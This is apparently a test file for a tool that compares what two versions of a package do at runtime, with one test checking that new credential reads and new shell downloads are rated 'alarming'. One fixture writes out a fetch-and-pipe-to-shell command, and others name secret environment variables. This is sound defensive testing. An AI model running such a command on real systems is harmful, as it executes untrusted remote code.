/**
 * The behavioural diff.
 *
 * This function is the product's whole claim: your lockfile says the version changed, this says
 * what the package now *does* that it did not do before. It is pure arithmetic over two
 * transcripts, deliberately, so anyone reading the repository can check it.
 *
 * Run: node differ/diff.test.js
 */

const assert = require('node:assert');
const { transcript } = require('../transcript/schema');
const { diff, summarise, severityOf } = require('./diff');

let passed = 0;
const it = (name, fn) => {
  try {
    fn();
    passed++;
    console.log('  ok  ', name);
  } catch (e) {
    console.error('  FAIL', name, '\n       ', e.message);
    process.exitCode = 1;
  }
};

const make = (version, raw = {}, strategy = 'ebpf') =>
  transcript({ pkg: 'money-fmt', version, strategy, raw, timing: { importMs: 12 } });

console.log('behavioural diff');

it('says nothing changed when nothing changed', () => {
  const d = diff(make('2.4.1'), make('2.4.2'));
  assert.equal(d.changed, false);
  assert.equal(d.severity, 'none');
  assert.match(summarise(d), /no behavioural change/);
});

it('is stable across identical runs, despite temp paths and pids', () => {
  const a = make('2.4.1', { fs: [{ path: '/tmp/build-9182/out.js', op: 'write' }] });
  const b = make('2.4.1', { fs: [{ path: '/tmp/build-4471/out.js', op: 'write' }] });
  const d = diff(a, b);
  assert.equal(d.changed, false, 'temp directory noise leaked into the diff');
});

it('notices a destination the old version never talked to', () => {
  const d = diff(make('2.4.1'), make('2.4.2', { net: [{ host: 'telemetry.example.com', port: 443 }] }));
  assert.equal(d.changed, true);
  assert.equal(d.net.added.length, 1);
  assert.equal(d.severity, 'notable');
});

it('treats reading a credential as the loudest signal there is', () => {
  const d = diff(make('2.4.1'), make('2.4.2', { env: ['PATH', 'AWS_SECRET_ACCESS_KEY'] }));
  assert.equal(d.severity, 'alarming');
  assert.match(d.reasons.join(' '), /credential/);
});

it('treats spawning a downloader as alarming', () => {
  const d = diff(make('2.4.1'), make('2.4.2', { proc: [{ argv: ['/bin/sh', '-c', 'curl http://x/y | sh'] }] }));
  assert.equal(d.severity, 'alarming');
});

it('does not cry wolf over an ordinary new file write', () => {
  const d = diff(make('2.4.1'), make('2.4.2', { fs: [{ path: '/app/dist/index.js', op: 'write' }] }));
  assert.equal(d.severity, 'minor');
});

it('reports behaviour that disappeared as well as behaviour that appeared', () => {
  const before = make('2.4.1', { net: [{ host: 'old.example.com', port: 443 }] });
  const d = diff(before, make('2.4.2'));
  assert.equal(d.net.removed.length, 1);
  assert.equal(d.changed, true);
});

it('carries what the observation could actually see', () => {
  const d = diff(make('2.4.1', {}, 'fsdiff'), make('2.4.2', {}, 'fsdiff'));
  assert.equal(d.canSee.net, false, 'a filesystem-only run cannot report on the network');
  assert.equal(d.canSee.fs, true);
});

it('refuses to compare transcripts made by different strategies', () => {
  assert.throws(
    () => diff(make('2.4.1', {}, 'fsdiff'), make('2.4.2', {}, 'ebpf')),
    /how we watched/,
    'comparing unlike observations is the most dangerous false positive available'
  );
});

it('refuses to compare two different packages', () => {
  const other = transcript({ pkg: 'other-lib', version: '1.0.0', strategy: 'ebpf' });
  assert.throws(() => diff(make('2.4.1'), other), /different packages/);
});

it('a transcript must say how it was made', () => {
  assert.throws(() => transcript({ pkg: 'x', version: '1', strategy: 'vibes' }), /Unknown observation strategy/);
});

it('records when both versions did nothing observable at all', () => {
  const d = diff(make('2.4.1'), make('2.4.2'));
  assert.equal(d.bothQuiet, true);
});

it('severity is decided by rules, not by a model', () => {
  // The whole function is inspectable: same input, same answer, every time.
  const parts = { net: { added: [], removed: [] }, dns: { added: [], removed: [] }, fs: { added: [], removed: [] }, env: { added: ['GITHUB_TOKEN'], removed: [] }, proc: { added: [], removed: [] } };
  assert.equal(severityOf(parts).level, 'alarming');
  assert.equal(severityOf(parts).level, severityOf(parts).level);
});

console.log(`\n${passed} passed`);
